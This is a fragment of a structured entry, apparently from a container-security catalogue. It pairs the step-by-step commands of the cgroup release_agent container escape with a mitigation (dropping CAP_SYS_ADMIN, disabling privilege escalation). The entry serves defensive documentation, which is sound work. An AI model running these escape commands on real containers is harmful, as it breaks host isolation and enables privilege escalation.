    technique: "1. Mount a cgroup: mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp\n2. Create a child cgroup: mkdir /tmp/cgrp/x\n3. Enable notifications: echo 1 > /tmp/cgrp/x/notify_on_release\n4. Set release_agent to host path: echo /path/on/host > /tmp/cgrp/release_agent\n5. Trigger: echo 0 > /tmp/cgrp/x/cgroup.procs",
    mitigation: "Drop CAP_SYS_ADMIN. Use Kubernetes SecurityContext with allowPrivilegeEscalation: false."
